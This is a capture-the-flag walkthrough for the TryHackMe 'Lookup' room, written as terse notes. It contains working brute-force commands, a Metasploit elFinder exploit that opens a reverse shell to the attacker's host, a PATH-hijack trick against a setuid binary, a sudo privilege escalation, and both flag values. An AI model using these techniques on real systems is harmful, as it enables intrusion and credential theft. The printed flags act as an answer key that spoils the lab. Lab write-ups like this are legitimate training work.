@@ -1,0 +1,123 @@
+THM:     
+Level:   Easy
+Room:    Lookup.thm
+Date:    20/12/2024
+Goal:    flag 1: user.txt
+         flag 2: root.txt
+
+IP:      10.10.161.216
+
+Method:
+
+#Add target IP to hosts file
+vim /etc/hosts
+#SCANNING
+Check for open ports
+  rustscan
+  nmap
+    port 22
+    port 80
+
+#ENUMERATE DIR AND FILES
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://lookup.thm/FUZZ -e .php
+  /login.php
+  /index.php
+
+#LOGIN ATTEMPT
+error message: username and password are wrong
+error message: password is wrong - when i tried admin:password credentials
+
+#ENUMERATE USERS
+use python script to enumerate users
+python3 ./enum_user.py
+  admin  
+  jose
+
+#PASSWORD SEARCH
+  Hydra
+    hyddra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:Wrong" -v
+  jose password: Password123
+
+#Login to lookup.thm => files.lookup.thm/elFinder
+
+#FIND EXPLOIT
+Searchsploit elFinder v 2.1 47
+  metasploitable
+
+msfconsole
+search elFinder
+use 4
+set Rhosts files.lookup.thm
+set lhost 10.13.61.182
+set lport 1234
+exploit  //executes the exploit
+
+  meterpreter session opened
+shell
+pthon3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+cat /etc/passwd
+  printed /etc/passwd
+#LATERAL MOVEMENT
+  find / -perm /4000 2>/dev/null //checks and lists sticky files
+ 
+ from the list /usr/sbin/pwm stands out
+ cat /usr/sbin/pwm
+ its an executable, so mostly unreadable, but gives some info about .password file being accessed
+ 
+ ls -al /home/think
+ there is a .password file in this dir
+
+ls -al /usr/sbin/pwn //shows permission of pwm file
+-rwsr-sr-x
+/usr/sbin/pwm //runs pwm 
+
+this uses id command and looks for .password file if id found.
+we are uid=33(www-data), so pwm throws error as we dont have .passwords file
+
+can use PATH parameters to manipulate this by adding our own path and id information to front of PATH list  
+echo $PATH //shows a list of PATHs computer uses
+
+export PATH=/tmp:$PATH //adds /tmp to PATH
+
+touch /tmp/id //creates id file
+ 
+echo '#!/bin/bash' > /tmp/id //populates id file
+echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id //appends to id file
+chmod +x /tmp/id //make file executable
+/usr/sbin/pwm //executes pwm
+prints the .password list from think
+
+copy and put into a file: pass_think.txt for use to crack thinks password
+use hydra:
+hydra -l think -P pass_think.txt ssh://lookup.thm  //crack think password from list
+finds password for think
+
+ssh think@lookup.thm  //ssh into lookup.thm as think
+ls //lists current dir
+and first flag (user.txt) is there
+cat user.txt  //prints first flag
+38375fb4dd8baa2b2039ac03d92b820e
+
+PRIV-ESC
+now we need to get root
+
+sudo -l  //check if any files allow think to use sudo
+ (ALL) /usr/bin/look
+ 
+ the look command on geeksforgeeks.org for info
+ used for locating specified lines, and reading them
+ls -al /usr/bin/look //check permissions
+ rwxr-xr-x
+ so when we use /usr/bin/look with sudo it will execute as though we are root
+
+SECOND FLAG
+sudo look '' /root/root.txt //uses our privesc to access the root file and print root.txt which is the second flag.
+5a285a9f257e45c68bb6c9f9f57d18e8
+
+
+
+
+
+
